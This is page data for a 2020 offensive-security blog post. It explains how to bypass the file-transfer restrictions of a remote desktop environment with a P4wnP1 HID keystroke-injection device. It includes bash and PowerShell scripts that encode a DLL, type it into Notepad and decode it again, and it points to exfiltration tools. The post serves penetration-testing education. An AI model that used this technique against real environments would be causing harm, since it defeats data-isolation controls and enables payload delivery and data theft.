{"componentChunkName":"component---src-templates-blog-post-js","path":"/Bypass-RAS-host-isolation/","result":{"data":{"site":{"siteMetadata":{"title":"Offensive Security mindset"}},"markdownRemark":{"id":"4695dc62-d814-502e-9346-e255ce95a8c5","excerpt":"TLDR;\nUsing HID attacks to break remote host isolation. The purpose of this short article is to share a technique to bypass the file exchange restrictions that…","html":"<blockquote>\n<p>TLDR;\nUsing HID attacks to break remote host isolation.</p>\n</blockquote>\n<p>The purpose of this short article is to share a technique to bypass the file exchange restrictions that can be enforced on remote access environments. When implementing a remote environment (e.g. VDI [Virtual Desktop Infrastructure] or RDS [Remote Desktop Services] environments), it is possible to prevent file upload and download from the RAS [Remote Access Services] environment. The purpose being to ensure that the data is kept within the organization’s premises.</p>\n<p><em>From this starting point, I was looking for a technique to circumvent these restrictions to be able to upload arbitrary payloads on the target remote host and at a later stage, being able to exfiltrate files from the remote host.</em></p>\n<p>To achieve this goal, I enumerated all the input channels at my disposal to interact with the RAS environment from my nomad device. The most obvious input channels available are the keyboard and the mouse. As such, a HID attack seemed a good candidate to upload arbitrary content. HID attacks consist of plugging a device to a target host, which is programmed to inject specific keystrokes. For this purpose, I really enjoy using P4wnP1. The P4wnP1 A.L.O.A. project turns a Raspberry Pi [RPI] into an attacking machine able to carry out all sort of attacks including HID attacks. The tool is very optimized and allows to <em>type</em> (i.e. inject keystrokes) at a lightning speed on a target host.</p>\n<h2>P4wnP1 as an accelerator</h2>\n<h3>Payload preparation</h3>\n<p><em>What is the link between a P4wnP1 and targeting an isolated remote access environment?</em></p>\n<p>Well, the idea here is to leverage the P4wnP1 to do the heavy lifting for us and literally <em>type</em> our payload on the target RAS environment. As the P4wnP1 can only inject printable characters, we will need to adapt our payload.</p>\n<p>Let’s say, we would like to upload the file <em>someFile.dll</em>. The following are steps to follow to prepare our payload. I tried several approaches to prepare the payloads, which were not successful. Most of issues were (i) typing errors leading to corrupted files and (ii) an eternity to type the payload.  Finally, I came up with the following sequence, which had the advantage of optimizing the typing speed free of typing errors:</p>\n<ol>\n<li>ZIP compression of the payload;</li>\n<li>Base64 encoding of the archive; and</li>\n<li>Hexadecimal conversion of the file.</li>\n</ol>\n<p>On my Linux attacking machine, the aforementioned steps could be reproduced as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">fi=&quot;./someFile.dll&quot;\nfz=&quot;$fi.zip&quot;\nfb=&quot;$fz.b64&quot;\nfh=&quot;$fb.hex&quot;\nff=&quot;$fh.txt&quot;\n\nzip &quot;$fi&quot; &quot;$fz&quot;\n\ncat &quot;$fz&quot; | base64 -w 0 &gt;&gt; &quot;$fb&quot;\n\ncat &quot;$fb&quot; | xxd -plain &gt;&gt; &quot;$fh&quot;\n\ncat &quot;$fh&quot; | tr -d “\\n” &gt; &quot;$ff&quot;\n\necho &quot;The final payload $ff (hash: $(sha256sum $ff)) based on the file $fi (hash: $(sha256sum $fi)) is ready to be used&quot;</code></pre></div>\n<h3>Preparation of the remote host</h3>\n<p>Once the payload is ready, the RAS environment needs to be prepared to foster the payload. I would advise using <em>Notepad.exe</em> but any similar application will work. <br /></p>\n<blockquote>\n<p>During the transfer, you will not be able to use the RAS environment. It is necessary that the receiving application (e.g. <em>Notepad.exe</em>) keeps the focus during the transfer. Otherwise, parts of the payload would be missing leading to a corrupted file.</p>\n</blockquote>\n<p>Last but not least, the RPI needs to be plugged to the nomad device via USB. Once the P4wnP1 is up and running, you can copy the payload (<code class=\"language-text\">cat someFile.dll.zip.b64.hex.txt | xclip -sel clip</code>) and connect to it using your preferred mean (e.g. direct Wi-Fi, or using directly the browser of the nomad device). Under the “HIDSCRIPT” tab, you can paste the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">layout(&#39;us&#39;)\t\t// US Keyboard layout\ntypingSpeed(10,0) \t// Wait X ms between key strokes + additional random value between 0ms &amp; Yms\ndelay(10)\t\t\t// Xms delay\ntype(&quot;&lt;YourPayload&gt;&quot;)</code></pre></div>\n<br />\n<blockquote>\n<p>The keyboard layout needs to match the one of the RAS environment. The numerical values can be adjusted as well if needed.</p>\n</blockquote>\n<h3>Launching the attack</h3>\n<p>At this point, everything is set and the “Run” button can be hit to instruct the P4wnP1 writing the payload. If everything is working fine, you will see the Notepad being filled of characters. Keep an eye on the Notepad to be aware when the transfer is completed. The Notepad content can be saved on the filesystem of the RAS environment. The last step is to apply the same operations in a reverse order to get the initial DLL file. PowerShell can be used for this purpose.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">PS&gt; $temp = &quot;&quot;\nPS&gt; $rawfile = &quot;.\\transfer.txt&quot; \t# transfer.txt holds the payload typed with the RPI\nPS&gt; $zipfile = &quot;.\\transfer.zip&quot;\nPS&gt; $finalfile = &quot;.\\someDll.dll&quot;\n\nPS&gt; $payload = Get-Content &quot;$rawfile&quot;\n\n# Back to the Base64 payload\nPS&gt; ($payload -split &quot;(\\w{2})&quot; ).Split(&#39;&#39;,[System.StringSplitOptions]::RemoveEmptyEntries) | forEach {$temp += [char]([convert]::toint16($_,16))}\n\n# Back to the ZIP\nPS&gt; [IO.File]::WriteAllBytes($zipfile, [Convert]::FromBase64String($temp))\n\n# Back to the initial DLL file\nPS&gt; Expand-Archive -LiteralPath $zipfile  -DestinationPath $finalfile\n\nPS&gt; &quot;The payload $finalfile (hash: Get-FileHash -Algorithm SHA256 $finalfile) has been successfully retrieved from the file $rawfile (hash: $(Get-FileHash -Algorithm SHA256 $rawfile))&quot;\n\nPS&gt; Clear-Variable -name temp,rawfile,zipfile,finalfile,payload</code></pre></div>\n<br/>\nHere we go ! If all the checksums match, the file transfer has been successful! From there, you can upload any file on the RAS environment.\n<h2>Closing thoughts</h2>\n<p>To the best of my knowldege, I am not aware of a native way to prevent such attacks on Windows systems. Even though, the impact of exploiting this technique is pretty important, it requires a threat agent to have already access to a remote access environment.</p>\n<p>But, what about file exfiltration? With the upload capability, it is straight forward to upload tools to establish an exfiltration channel. The following are examples of tools that can be used to setup an exfiltration channel:</p>\n<ul>\n<li><a href=\"https://github.com/earthquake/XFLTReaT\">XFLTReaT</a>;</li>\n<li><a href=\"http://rdp2tcp.sourceforge.net/\">rdp2tcp</a>;</li>\n<li><a href=\"https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/\">PTP-RAT</a>.</li>\n</ul>\n<p>I hope that you enjoyed this post!</p>\n<br>","frontmatter":{"title":"Breaking a remote host isolation","date":"October 20, 2020","description":"This article presents an approach to upload files on remote access environments."}}},"pageContext":{"slug":"/Bypass-RAS-host-isolation/","previous":{"fields":{"slug":"/whoami/"},"frontmatter":{"title":"~$whoami"}},"next":null}},"staticQueryHashes":["1246554614","2841359383"]}